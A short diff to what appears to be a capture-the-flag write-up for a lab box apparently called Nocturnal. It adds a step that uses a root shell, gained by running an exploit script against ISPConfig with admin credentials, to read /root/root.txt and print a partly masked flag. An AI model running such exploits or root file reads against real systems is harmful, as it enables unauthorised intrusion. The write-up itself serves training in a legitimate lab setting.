@@ -91,4 +91,10 @@ $ python3 exploit.py http://localhost:8080/ admin slowmotionapocalypse
 ispconfig-shell#
 ```
 
+and from this shell we can the root flag.
+```
+ispconfig-shell# cat /root/root.txt
+a8a9f*****************384dc8aba8
+```
+
 ![](assets/img/nocturnal_congrats.png)
